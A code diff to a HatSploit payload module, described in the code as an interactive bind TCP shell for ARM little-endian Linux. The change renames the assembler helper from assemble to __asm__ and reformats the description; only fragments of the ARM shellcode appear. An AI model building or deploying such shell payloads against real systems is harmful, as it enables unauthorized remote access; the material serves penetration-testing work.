@@ -15,10 +15,10 @@ class HatSploitPayload(Payload, Handler, Linux):
             'Authors': [
                 "Ivan Nikolskiy (enty8080) - payload developer",
             ],
-            'Description': (
-                "This payload creates an interactive bind TCP shell for Linux "
-                "with ARM little-endian architecture."
-            ),
+            'Description': """
+                This payload creates an interactive bind TCP shell for Linux
+                with ARM little-endian architecture.
+            """,
             'Arch': ARCH_ARMLE,
             'Platform': OS_LINUX,
             'Type': BIND_TCP,
@@ -28,13 +28,13 @@ class HatSploitPayload(Payload, Handler, Linux):
                             advanced=True)
 
     def implant(self):
-        return self.assemble(
+        return self.__asm__(
             """
             start:
                 add r1, pc, 1
                 bx r1
             """
-        ) + self.assemble(
+        ) + self.__asm__(
             f"""
             start:
                 movs r7, 0x3f
@@ -63,13 +63,13 @@ class HatSploitPayload(Payload, Handler, Linux):
         )
 
     def run(self):
-        return self.assemble(
+        return self.__asm__(
             """
             start:
                 add r1, pc, 1
                 bx r1
             """
-        ) + self.assemble(
+        ) + self.__asm__(
             f"""
             start:
                 movs r0, 2
